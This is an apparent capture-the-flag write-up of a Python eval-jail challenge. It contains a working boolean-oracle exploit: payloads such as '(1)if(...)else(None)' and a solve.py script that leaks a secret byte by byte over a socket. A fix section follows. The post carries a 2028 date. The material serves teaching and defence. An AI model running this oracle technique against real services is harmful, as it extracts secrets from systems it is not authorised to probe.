---
layout: post
title: "Type Exception"
date: 2028-05-20 09:00:00 -0500
categories: [HackTheBox, Challenges, Misc]
tags: [hackthebox, challenge, misc, pyjail, eval-injection, boolean-oracle, python]
description: "A Python eval-jail that 'sandboxes' with a character blacklist and a stripped __builtins__ leaks its flag one byte at a time — type() of two constant branches becomes a 1-bit oracle, read with is, hex byte codes, and a generator-list pop."
---

## Overview

Type Exception is a **Medium** HackTheBox **Misc** challenge. A `nc` service reads a line
and runs it through Python's `eval` inside a namespace that exposes only two names — the
builtin `type` and the secret `flag` — behind a character/name blacklist. There is no code
execution to be had: the input can never break out of the `type( … )` wrapper. But `type()`
of two constant branches prints two *distinguishable* classes, and that single bit is enough
to read the flag byte by byte. This is [eval injection](https://cwe.mitre.org/data/definitions/95.html)
where the exfil channel is an [observable discrepancy](https://cwe.mitre.org/data/definitions/203.html).

## The challenge

```python
BLACKLIST = '"%&\',-/_:;@\\`{|}~*<=>[] \t\n\r\x0b\x0c'

def check(s):
    if re.match(r"[a-zA-Z]{4}", inp):                 # no 4 leading letters
        return
    elif len(set(re.findall(r"[\W]", inp))) > 4:       # <= 4 distinct non-word chars
        return
    else:
        return all(ord(x) < 0x7f for x in s) and all(x not in s for x in BLACKLIST) and check_balanced(s)

def safe_eval(s, func):
    if not check(s):
        print("...")
    else:
        print(eval(f"{func.__name__}({s})", {"__builtins__": {func.__name__: func}, "flag": FLAG}))

safe_eval(inp, type)     # -> eval(f"type({s})", {"__builtins__": {"type": type}, "flag": FLAG})
```

So whatever you send becomes the argument to `type()`. The filter bans quotes, comma,
underscore, `= < >`, spaces, `[] {}`, requires **balanced parens** (with no closing paren
before its opener), allows at most **4 distinct** non-word characters, and forbids an input
that starts with 4 letters.

## The technique

Two observations kill the sandbox:

1. **You cannot escape `type( … )`.** Balanced parens with no premature close mean your input
   is always a single expression *inside* the call. `type(x)` returns a type object whose
   printed form depends only on x's *type*, never the flag's *value* — and the 3-argument
   `type(name, bases, dict)` form that would let you smuggle the flag into a class name needs
   commas, which are banned.

2. **`type()` of two constant branches is a boolean oracle.** Pick two expressions of
   different type and let a condition choose between them:

   ```
   type((1)if(COND)else(None))
     COND True   -> <class 'int'>        (YES)
     COND False  -> <class 'NoneType'>   (NO)
     COND raises -> Error                (absent / out of range)
   ```

   Every payload starts with `(` so it dodges the 4-letter rule, and uses only `( ) .` — three
   distinct special characters, under the limit.

Building comparisons with a blacklist that bans `==`, quotes, commas and brackets:

- `==` is banned, so use **`is`**. Small integers (-5..256) are cached, so `x is 5` behaves
  like `x == 5` for the indexes, counts and byte values we deal with.
- Quotes are banned, so address bytes by **hex code**: `flag.encode().index(0x68)`.
- Commas/brackets are banned, so the toolbox is **single-argument** methods:
  `.encode()`, `.index(b)` (first occurrence), `.rindex(b)` (last), `.count(b)`.
- Reading a *repeated* character's middle positions without `[]`: materialise a list from a
  generator and pop it —
  `type(flag.split())((i)for(i)in(flag.encode())).pop(IDX)is(b)`. `type(flag.split())` is the
  `list` type (the flag has no spaces, so `split()` yields a one-element list), calling it on
  the generator builds the byte list, and `.pop(IDX)` reads any position authoritatively.

## Solution

For every printable byte: find its first index (`index` → `Error` means the byte is absent),
its count, and — for repeats — its last index (`rindex`) and each middle position (`pop`).
Sort the `(position, char)` pairs to rebuild the flag. One **persistent** TCP connection
pipelines all the queries (the service loops on `input()`), so the full leak is ~350 queries
in well under a minute instead of one connection per query.

Create `solve.py`:

```python
#!/usr/bin/env python3
import socket, string, sys
from collections import defaultdict

HOST, PORT = sys.argv[1], int(sys.argv[2])
IF = "(1)if({c})else(None)"

class Oracle:
    def __init__(self):
        self.s = socket.socket(); self.s.connect((HOST, PORT)); self.buf = b""
    def ask(self, check):
        self.s.sendall((IF.format(c=check) + "\n").encode())
        while True:
            for m, r in ((b"<class 'int'>", 1), (b"<class 'NoneType'>", 0), (b"Error", 2)):
                if m in self.buf:
                    self.buf = self.buf.split(m, 1)[1]; return r
            d = self.s.recv(4096)
            if not d: raise ConnectionError("closed")
            self.buf += d

def main():
    o = Oracle(); occupied = set(); found = defaultdict(dict)
    for ch in string.printable:
        hx = hex(ord(ch)); first = None
        for idx in range(100):
            if idx in occupied: continue
            r = o.ask(f"flag.encode().index({hx})is({idx})")
            if r == 2: first = None; break
            if r == 1: first = idx; break
        if first is None: continue
        found[ch]["indexes"] = [first]; occupied.add(first)
        cnt = 1
        for c in range(1, 40):
            if o.ask(f"flag.encode().count({hx})is({c})") == 1: cnt = c; break
        found[ch]["count"] = cnt
        if cnt > 1:
            last = None
            for idx in range(first + 1, 100):
                if idx in occupied: continue
                if o.ask(f"flag.encode().rindex({hx})is({idx})") == 1: last = idx; break
            if last is not None:
                found[ch]["indexes"].append(last); occupied.add(last)
                if cnt > 2:
                    flist = "type(flag.split())((i)for(i)in(flag.encode()))"
                    need = cnt - 2; got = []
                    for idx in range(first + 1, last):
                        if idx in occupied or len(got) == need: continue
                        if o.ask(f"{flist}.pop({idx})is({hx})") == 1:
                            got.append(idx); occupied.add(idx)
                    found[ch]["indexes"] += got
    pairs = sorted((i, ch) for ch, d in found.items() for i in d["indexes"])
    print("FLAG:", "".join(ch for _, ch in pairs))

if __name__ == "__main__":
    main()
```

Run it against the instance:

```bash
python3 solve.py <target-ip> <target-port>
# FLAG: HTB{...}
```

The flag is derived live from the running service — value redacted here.

## Why it worked

The service tried to sandbox `eval` with a character blacklist, a stripped `__builtins__`,
and a name restriction. None of those are a security boundary. A blacklist enumerates what
is *forbidden* instead of what is *permitted*, and it left `type`, `is`, hex integer literals,
generator expressions and single-argument string methods all reachable. Crucially, the
function returned an *observable* value that differed by type — and a single distinguishable
output bit per query is a complete read oracle for any secret in the eval scope. No RCE
required.

## Fix / defense

- Never `eval`/`exec` attacker input, even with an empty `__builtins__` and a character
  blacklist. A blacklist is not a sandbox, and any observable output is an oracle.
- Keep secrets out of any reachable evaluation scope — don't place `flag` in the globals dict.
- If expressions genuinely must be evaluated, parse them with an allow-list AST evaluator
  (`ast.parse` plus a node whitelist) rather than filtering the input string.
